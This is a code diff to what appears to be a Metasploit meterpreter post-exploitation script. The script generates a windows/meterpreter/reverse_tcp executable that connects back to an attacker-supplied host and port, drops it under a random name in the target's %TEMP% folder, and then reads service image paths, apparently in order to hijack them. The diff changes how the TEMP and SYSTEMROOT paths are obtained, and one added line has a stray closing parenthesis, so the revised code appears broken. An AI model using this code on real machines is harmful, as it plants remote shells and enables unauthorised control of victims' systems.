@@ -51,6 +51,10 @@ opts.parse(args) do |opt, idx, val|
   end
 end
 
+envs = client.sys.config.getenvs('TEMP', 'SYSTEMROOT')
+tempdir = envs['TEMP']
+sysdir = envs['SYSTEMROOT']
+
 # Get the exe payload.
 pay = client.framework.payloads.create("windows/meterpreter/reverse_tcp")
 pay.datastore['LHOST'] = rhost
@@ -58,9 +62,8 @@ pay.datastore['LPORT'] = rport
 raw  = pay.generate
 exe = Msf::Util::EXE.to_win32pe(client.framework, raw)
 #and placing it on the target in %TEMP%
-tempdir = client.fs.file.expand_path("%TEMP%")
 tempexename = Rex::Text.rand_text_alpha((rand(8)+6))
-tempexe = tempdir + "\\" + tempexename + ".exe"
+tempexe = "#{tempdir}\\#{tempexename}.exe"
 print_status("Preparing connect back payload to host #{rhost} and port #{rport} at #{tempexe}")
 fd = client.fs.file.new(tempexe, "wb")
 fd.write(exe)
@@ -129,7 +132,7 @@ service_list.each do |serv|
     moved = false
     configed = false
     #default path, but there should be an ImagePath registry key
-    source = client.fs.file.expand_path("%SYSTEMROOT%\\system32\\#{serv}.exe")
+    source = "#{sysdir}\\system32\\#{serv}.exe")
     #get path to exe; parse out quotes and arguments
     sourceorig = registry_getvaldata("#{serviceskey}\\#{serv}","ImagePath").to_s
     sourcemaybe = client.fs.file.expand_path(sourceorig)
